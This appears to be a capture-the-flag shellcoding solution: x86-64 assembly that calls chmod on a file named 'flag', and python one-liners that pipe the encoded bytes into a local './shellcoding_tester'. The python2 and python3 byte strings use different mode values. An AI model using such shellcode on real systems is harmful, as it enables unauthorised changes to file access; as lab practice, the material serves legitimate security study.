```assembly
push 0x67616c66
push rsp
pop rdi
push 0x04
pop rsi
mov al, 0x5a
syscall
```

---

`python2 -c "print '\x68\x66\x6c\x61\x67\x54\x5f\x6a\x67\x5e\xb0\x5a\x0f\x05'" | ./shellcoding_tester`

`python3 -c "import sys; sys.stdout.buffer.write(b'\x68\x66\x6c\x61\x67\x54\x5f\x6a\x04\x5e\xb0\x5a\x0f\x05')" | ./shellcoding_tester`
